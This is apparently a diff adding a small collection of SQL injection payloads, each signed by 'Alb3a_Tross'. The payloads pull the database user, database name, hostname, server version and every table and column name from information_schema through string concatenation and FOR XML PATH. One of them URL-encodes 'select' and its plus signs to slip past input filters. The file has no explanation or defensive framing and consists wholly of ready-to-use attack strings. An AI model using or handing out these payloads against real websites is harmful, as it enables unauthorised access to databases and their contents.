@@ -1,0 +1,7 @@
++'</h1>'+'Injected by Alb3a_Tross || '+'USER :: '+user+' || '+'DATABASE :: '+db_name()+' || '+'Hostname :: '+host_name()+'VERSION :: '+@@version+' || '+(select+' || '+table_name+' :: '+column_name from information_schema.columns FOR XML PATH(''))
+
+
+(concat('Injected By Alb3a_Tross',0x1f,@@version,0x1f,@@servername,(select table_name from information_schema.tables FOR XML PATH('')))))
+
+
+concat('</title>','Inject By Alb3a_Tross','<br>','version==>',@@version,'<br>',(%73elect+%2b' '%2btable_name%2b'::'%2bcolumn_name +from+information_schema.columns FOR XML PATH('')))
